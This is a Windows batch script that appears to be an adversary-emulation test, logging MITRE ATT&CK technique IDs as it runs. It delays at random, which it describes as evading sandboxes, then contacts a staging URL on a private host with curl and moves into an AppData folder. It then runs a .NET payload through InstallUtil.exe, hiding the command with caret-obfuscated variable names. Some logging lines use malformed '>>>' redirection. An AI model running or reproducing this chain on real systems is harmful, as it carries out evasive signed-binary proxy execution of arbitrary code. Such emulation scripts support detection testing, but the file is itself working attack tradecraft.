@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ placeholder assignments with random variable names
SET txisnba=%APPDATA%\8206\f8820335
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8206-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=exploren.txt
SET dvhhyc=8206

REM Derived variables
SET logfile=%APPDATA%\%rrocubc%\macula-simulations.log
SET agent=!jwcnifl!

REM Create log directory if it doesn't exist
IF NOT EXIST "%APPDATA%\%rrocubc%" mkdir "%APPDATA%\%rrocubc%" 2>nul

REM Initial delay to evade sandbox (30-60 seconds)
SET /A firstdelay=30 + %RANDOM% %% 31
echo [!DATE! !TIME!][DEBUG][!agent!]: delay_start=!firstdelay!seconds>>> "!logfile!" 2>nul
timeout /t !firstdelay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!agent!]: delay_complete>>> "!logfile!" 2>nul

REM Phase 1: Heartbeat check (T1105 - Ingress Tool Transfer)
echo [!DATE! !TIME!][DEBUG][!agent!]: heartbeat_start=!keghkgto!>>> "!logfile!" 2>nul
SET hbresult=0
SET hberror=
curl -k -s -o nul "!keghkgto!"
IF !ERRORLEVEL! EQU 0 (
    SET hbresult=1
) ELSE (
    SET hberror=connection_failed_!ERRORLEVEL!
)

REM Get consistent timestamp using WMIC
SET timestamp=
FOR /F "tokens=2 delims==" %%I IN ('wmic os get localdatetime /VALUE 2^>NUL') DO SET datetime=%%I
IF DEFINED datetime (
    SET year=!datetime:~0,4!
    SET month=!datetime:~4,2!
    SET day=!datetime:~6,2!
    SET hour=!datetime:~8,2!
    SET minute=!datetime:~10,2!
    SET second=!datetime:~12,2!
    SET millisecond=!datetime:~15,3!
    SET timestamp=!year!-!month!-!day! !hour!:!minute!:!second!.!millisecond!
)

REM Log TTP execution for heartbeat
IF NOT DEFINED timestamp (
    SET timestamp=!DATE! !TIME!
)
echo [!timestamp!][!agent!]: !rrocubc!-!dvhhyc!-T1105|Ingress Tool Transfer=!hbresult!:!hberror!>> "!logfile!" 2>nul
echo [!DATE! !TIME!][DEBUG][!agent!]: heartbeat_complete=!hbresult!>>> "!logfile!" 2>nul

REM Random delay between operations
SET /A midelay=5 + %RANDOM% %% 11
echo [!DATE! !TIME!][DEBUG][!agent!]: delay_start=!midelay!seconds>>> "!logfile!" 2>nul
ping -n !midelay! 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!agent!]: delay_complete>>> "!logfile!" 2>nul

REM Phase 2: Change directory
echo [!DATE! !TIME!][DEBUG][!agent!]: chdir_start=!txisnba!>>> "!logfile!" 2>nul
cd /d "!txisnba!" 2>nul
IF !ERRORLEVEL! NEQ 0 (
    echo [!DATE! !TIME!][DEBUG][!agent!]: chdir_failed=!ERRORLEVEL!>>> "!logfile!" 2>nul
    SET dirresult=0
    SET direrror=access_denied
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!agent!]: chdir_complete>>> "!logfile!" 2>nul
    SET dirresult=1
    SET direrror=
)

REM Get timestamp for directory change logging
SET timestamp=
FOR /F "tokens=2 delims==" %%I IN ('wmic os get localdatetime /VALUE 2^>NUL') DO SET datetime=%%I
IF DEFINED datetime (
    SET year=!datetime:~0,4!
    SET month=!datetime:~4,2!
    SET day=!datetime:~6,2!
    SET hour=!datetime:~8,2!
    SET minute=!datetime:~10,2!
    SET second=!datetime:~12,2!
    SET millisecond=!datetime:~15,3!
    SET timestamp=!year!-!month!-!day! !hour!:!minute!:!second!.!millisecond!
)

REM Log TTP execution for directory change (T1083 - File and Directory Discovery)
IF NOT DEFINED timestamp (
    SET timestamp=!DATE! !TIME!
)
echo [!timestamp!][!agent!]: !rrocubc!-!dvhhyc!-T1083|File and Directory Discovery=!dirresult!:!direrror!>> "!logfile!" 2>nul

REM Random delay using CHOICE
SET /A choidelay=8 + %RANDOM% %% 8
echo [!DATE! !TIME!][DEBUG][!agent!]: delay_start=!choidelay!seconds>>> "!logfile!" 2>nul
CHOICE /C Y /N /D Y /T !choidelay! >nul
echo [!DATE! !TIME!][DEBUG][!agent!]: delay_complete>>> "!logfile!" 2>nul

REM Phase 3: Execute .NET DLL via InstallUtil with obfuscation
echo [!DATE! !TIME!][DEBUG][!agent!]: installutil_start=!xzanpex!>>> "!logfile!" 2>nul

REM Obfuscated InstallUtil.exe path with caret escapes (medium-heavy density)
REM Using carets in variable names only, not values
SET i^ns^tall=Install
SET u^ti^l=Util
SET sy^sp^ath=C:\Windows\Microsoft.NET\Framework\v4.0.30319

REM Build command fragments with proper values
SET cm^d1=/logfile=install.log
SET cm^d2=/LogToConsole=false
SET cm^d3=/U

REM Execute obfuscated command
SET execresult=0
SET execerror=
"!sy^sp^ath!\!i^ns^tall!!u^ti^l!.exe" !cm^d1! !cm^d2! !cm^d3! "!xzanpex!" 2>nul
IF !ERRORLEVEL! EQU 0 (
    SET execresult=1
    echo [!DATE! !TIME!][DEBUG][!agent!]: installutil_success>>> "!logfile!" 2>nul
) ELSE (
    SET execerror=execution_failed_!ERRORLEVEL!
    echo [!DATE! !TIME!][DEBUG][!agent!]: installutil_failed=!ERRORLEVEL!>>> "!logfile!" 2>nul
)

REM Get timestamp for InstallUtil logging
SET timestamp=
FOR /F "tokens=2 delims==" %%I IN ('wmic os get localdatetime /VALUE 2^>NUL') DO SET datetime=%%I
IF DEFINED datetime (
    SET year=!datetime:~0,4!
    SET month=!datetime:~4,2!
    SET day=!datetime:~6,2!
    SET hour=!datetime:~8,2!
    SET minute=!datetime:~10,2!
    SET second=!datetime:~12,2!
    SET millisecond=!datetime:~15,3!
    SET timestamp=!year!-!month!-!day! !hour!:!minute!:!second!.!millisecond!
)

REM Log TTP execution for InstallUtil (T1218 - Signed Binary Proxy Execution)
IF NOT DEFINED timestamp (
    SET timestamp=!DATE! !TIME!
)
echo [!timestamp!][!agent!]: !rrocubc!-!dvhhyc!-T1218|Signed Binary Proxy Execution=!execresult!:!execerror!>> "!logfile!" 2>nul

REM Final random delay before exit
SET /A finaldelay=%RANDOM% %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!agent!]: delay_start=!finaldelay!seconds>>> "!logfile!" 2>nul
timeout /t !finaldelay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!agent!]: delay_complete>>> "!logfile!" 2>nul

ENDLOCAL